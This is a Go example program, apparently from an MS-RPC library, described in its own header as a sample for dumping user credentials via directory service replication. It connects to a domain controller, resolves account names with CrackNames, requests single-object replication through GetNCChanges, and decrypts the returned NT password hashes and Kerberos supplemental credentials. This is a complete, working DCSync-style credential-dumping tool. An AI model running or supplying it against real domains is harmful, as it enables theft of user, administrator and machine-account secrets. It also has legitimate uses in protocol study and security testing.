//go:build exclude

// drsr is a sample for dumping the user credentials using directory service replication:

// example: go run drsr.go -names User1,Admin1,COMPUTER1$

package main

import (
	"context"
	"encoding/asn1"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"net"
	"os"
	"strings"

	"github.com/oiweiwei/go-msrpc/midl/uuid"
	"github.com/oiweiwei/go-msrpc/ndr"
	"github.com/oiweiwei/go-msrpc/ssp"
	"github.com/oiweiwei/go-msrpc/ssp/credential"
	"github.com/oiweiwei/go-msrpc/ssp/gssapi"

	"github.com/oiweiwei/go-msrpc/dcerpc"

	"github.com/oiweiwei/go-msrpc/msrpc/ad"
	"github.com/oiweiwei/go-msrpc/msrpc/drsr/drsuapi/v4"
	"github.com/oiweiwei/go-msrpc/msrpc/dtyp"
	"github.com/oiweiwei/go-msrpc/msrpc/epm/epm/v3"
	"github.com/oiweiwei/go-msrpc/msrpc/samr/samr/v1"

	"github.com/oiweiwei/go-msrpc/msrpc/erref/drsr"
	_ "github.com/oiweiwei/go-msrpc/msrpc/erref/win32"
)

var j = func(data any) string { b, _ := json.MarshalIndent(data, "", "  "); return string(b) }

func init() {
	// add credentials.
	gssapi.AddCredential(credential.NewFromPassword(os.Getenv("USERNAME"), os.Getenv("PASSWORD")))
	// add mechanism.
	gssapi.AddMechanism(ssp.SPNEGO)
	gssapi.AddMechanism(ssp.NTLM)
}

var (
	names []string
	debug bool
)

func init() {

	var ns string
	flag.StringVar(&ns, "names", "", "names to crack")
	flag.BoolVar(&debug, "debug", false, "debug mode")
	flag.Parse()

	if ns != "" {
		names = strings.Split(ns, ",")
	}
}

func main() {

	ctx := gssapi.NewSecurityContext(context.Background())

	cc, err := dcerpc.Dial(ctx, "ncacn_ip_tcp:"+os.Getenv("SERVER"),
		epm.EndpointMapper(ctx,
			net.JoinHostPort(os.Getenv("SERVER"), "135"),
			dcerpc.WithInsecure(),
		))
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}

	defer cc.Close(ctx)

	cli, err := drsuapi.NewDrsuapiClient(ctx, cc, dcerpc.WithSeal())
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}

	clientCaps := drsuapi.ExtensionsInt{Flags: 0x01000000 | 0x00008000 | 0x04000000}

	b, err := ndr.Marshal(&clientCaps, ndr.Opaque)
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}

	resp, err := cli.Bind(ctx, &drsuapi.BindRequest{
		Client: &drsuapi.Extensions{Data: b},
	})
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}

	// get the id using the provided name.
	cracked, err := cli.CrackNames(ctx, &drsuapi.CrackNamesRequest{
		Handle:    resp.DRS,
		InVersion: 1,
		In: &drsuapi.MessageCrackNamesRequest{
			Value: &drsuapi.MessageCrackNamesRequest_V1{
				V1: &drsuapi.MessageCrackNamesRequestV1{
					FormatOffered: 0xFFFFFFF0, // DS_NT4_ACCOUNT_NAME_SANS_DOMAIN_EX
					Names:         names,
					FormatDesired: 0x00000006, // DS_UNIQUE_ID_NAME
				},
			},
		},
	})

	if err != nil {
		fmt.Fprintln(os.Stderr, "crack_names", err)
		os.Exit(1)
	}

	items := cracked.Out.GetValue().(*drsuapi.MessageCrackNamesReplyV1).Result.Items

	for i, name := range items {

		if name.Status != 0 {
			fmt.Fprintln(os.Stderr, "unable to crack name for user", names[i], ":", drsr.FromCode(int32(name.Status)))
			continue
		}

		fmt.Fprintln(os.Stderr, "trying to get secret for user", names[i], "with guid", name.Name)

		//get the replica for object guid.
		nc, err := cli.GetNCChanges(ctx, &drsuapi.GetNCChangesRequest{
			Handle:    resp.DRS,
			InVersion: 8,
			In: &drsuapi.MessageGetNCChangesRequest{
				Value: &drsuapi.MessageGetNCChangesRequest_V8{
					V8: &drsuapi.MessageGetNCChangesRequestV8{
						MaxObjectsCount: 1,
						NC: &drsuapi.DSName{
							GUID: dtyp.GUIDFromUUID(uuid.MustParse(name.Name)),
						},
						Flags:             0x00000020 | 0x00000010,
						ExtendedOperation: 0x00000006,
					},
				},
			},
		})

		if err != nil {
			fmt.Fprintln(os.Stderr, err)
			os.Exit(1)
		}

		if debug {
			fmt.Println(j(nc))
		}

		reply := nc.Out.GetValue().(*drsuapi.MessageGetNCChangesReplyV6)

		prefixes := reply.PrefixTableSource.Build()

		object := map[string]interface{}{}

		for _, attr := range reply.Objects.EntityInfo.AttributeBlock.Attribute {

			oid, err := prefixes.AttributeToOID(attr.AttributeType)
			if err != nil {
				fmt.Fprintln(os.Stderr, "unknown attr", attr.AttributeType)
				os.Exit(1)
			}

			name, l := "", []interface{}{}

			for i := range attr.AttributeValue.Values {
				n, val, err := ad.ParseNameAndValue(oid, attr.AttributeValue.Values[i].Value, prefixes)
				if err != nil {
					fmt.Fprintln(os.Stderr, "parse name and value", err)
					os.Exit(1)
				}

				if _, ok := val.(asn1.ObjectIdentifier); ok {
					val = val.(asn1.ObjectIdentifier).String()
				}

				name, l = n, append(l, val)
			}

			if name != "" {
				if len(l) > 1 {
					object[name] = l
				} else {
					object[name] = l[0]
				}
			}
		}

		sid, _ := object["objectSid"].(*dtyp.SID)
		rid := uint32(0)
		if sid != nil {
			rid = sid.SubAuthority[len(sid.SubAuthority)-1]
		}

		// decrypt the unicode password hash.
		if b, _ := object["unicodePwd"].([]byte); len(b) != 0 {
			pwd, err := drsuapi.DecryptHash(ctx, rid, b)
			if err != nil {
				fmt.Fprintln(os.Stderr, err)
				return
			}
			object["unicodePwd"] = hex.EncodeToString(pwd)
		}

		// decode the supplemental credentials (kerberos tickets).
		if b, _ := object["supplementalCredentials"].([]byte); len(b) != 0 {
			creds, err := drsuapi.DecryptData(ctx, b)
			if err != nil {
				fmt.Fprintln(os.Stderr, err)
				return
			}
			props := samr.UserProperties{}
			if err := ndr.Unmarshal(creds, &props, ndr.Opaque); err != nil {
				fmt.Fprintln(os.Stderr, err)
				return
			}
			object["supplementalCredentials"] = props
		}

		// print.
		fmt.Println(j(object))
	}
}
